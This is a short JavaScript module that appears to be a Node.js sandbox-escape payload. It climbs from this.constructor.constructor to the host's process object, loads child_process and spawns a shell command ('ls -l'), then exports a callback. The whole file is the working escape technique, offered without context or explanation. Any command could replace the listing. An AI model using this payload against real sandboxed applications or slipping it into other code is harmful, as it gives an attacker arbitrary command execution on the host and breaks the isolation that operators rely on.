const globalFunc = this.constructor.constructor;

const hostProcess = globalFunc('return process')();

const { spawn }  = hostProcess.mainModule.require('child_process');
const child = spawn("ls", ["-l"]);

module.exports = function (cb) {
    cb(null, `Output: ${child}`)
}
